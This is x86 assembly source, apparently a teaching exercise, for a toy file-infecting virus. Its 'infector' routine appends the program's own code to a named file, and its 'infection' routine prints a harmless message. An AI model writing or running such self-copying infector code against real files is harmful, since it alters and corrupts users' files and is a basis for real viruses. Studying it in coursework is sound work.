section .data
    fd: dd 0
section .rodata
    str: db "Hello, Infected File!", 10
    str_len equ $ - str
section .text
global _start
global system_call
global infection
global infector
extern main
code_start:
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int      0x80          ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infection:
    mov     eax, 4          ;SYS_WRITE
    mov     ebx, 1          ;STDOUT
    mov     ecx, str        ;BUFFER
    mov     edx, str_len    ;BUFFER LENGTH
    int     0x80
    ret
    
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    ;open for append
    mov     eax, 5          ;SYS_OPEN
    mov     ebx, dword[ebp+8]          ;filename
    mov     ecx, 2001o        ;O_WRONLY | O_APPEND
    int     0x80
    mov dword[fd], eax
    ;write virus
    mov     eax, 4          ;SYS_WRITE
    mov     ebx, dword[fd]          ;the opened file
    mov     ecx, code_start        ;BUFFER
    mov     edx, code_end-code_start    ;BUFFER LENGTH
    int     0x80
    ;close file
    mov eax, 6
    mov     ebx, dword[fd]          ;the opened file
    int 0x80
    popad
    pop     ebp             ; Restore caller state
    ret
code_end: